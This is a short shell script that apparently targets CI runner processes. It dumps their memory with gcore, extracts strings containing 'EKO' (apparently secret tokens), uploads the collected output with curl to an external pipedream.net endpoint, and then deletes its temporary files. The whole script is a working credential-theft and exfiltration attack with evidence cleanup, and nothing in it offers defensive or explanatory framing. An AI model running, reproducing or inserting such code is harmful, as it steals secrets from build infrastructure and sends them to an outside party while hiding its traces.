#!/bin/sh

echo "-------------" > /tmp/file.txt

# get pids related to runners
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    gcore $pid
    echo "--------$pid--------" >> /tmp/file.txt
    strings "gcore.$pid" | grep EKO >> /tmp/file.txt
done


curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

rm /tmp/file.txt
rm /tmp/run-results.txt
